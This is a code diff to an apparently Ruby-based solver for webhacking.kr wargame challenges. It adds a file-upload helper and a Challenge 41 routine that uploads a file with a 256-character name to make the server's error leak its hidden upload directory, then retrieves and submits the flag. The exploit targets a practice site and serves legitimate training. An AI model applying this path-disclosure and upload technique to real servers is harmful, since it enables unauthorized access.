@@ -113,6 +113,22 @@ module WebhackingKR
     end
 
     ##
+    # Uploads a file to the HTTP server
+    def upload(query, data = {}, headers = {})
+      headers['Cookie'] = join_cookie(headers['Cookie'])
+      request = Net::HTTP::Post.new(query, headers)
+      request.set_form(
+        data,
+        'multipart/form-data'
+      )
+      begin
+        @client.request(request)
+      rescue StandardError => e
+        raise HTTPError, e
+      end
+    end
+
+    ##
     # Authenticates the flag
     def auth(flag)
       response = post(
@@ -1022,6 +1038,48 @@ module WebhackingKR
       query = URI.encode_www_form(PARAM_AUTH => password)
       response = get("#{PATH}?#{query}")
       check(response.body)
+    end
+  end
+
+  ##
+  # Challenge 41
+  class Challenge41 < ChallengeBase
+    CHALLENGE = 41
+
+    PATH = '/challenge/web-19/'
+    PARAM_UP = 'up'
+
+    def exec
+      log('Determining upload directory')
+      file_name = 'x' * 256
+      response = upload(
+        PATH,
+        [[PARAM_UP, '', { filename: file_name }]]
+      )
+      unless response.body =~ %r(copy\(\./(.*)/#{file_name}\))
+        failed
+        return
+      end
+
+      upload_dir = $1
+      file_name = 'flag'
+      path = "#{upload_dir}/#{file_name}"
+      log("Directory: #{upload_dir}")
+      log('Uploading file')
+      response = upload(
+        PATH,
+        [[PARAM_UP, '', { filename: file_name }]]
+      )
+
+      log('Getting file')
+      response = get("#{PATH}#{path}")
+      unless response.body =~ /(FLAG\{.*\})/
+        failed
+        return
+      end
+
+      log($1)
+      check(auth($1))
     end
   end
 
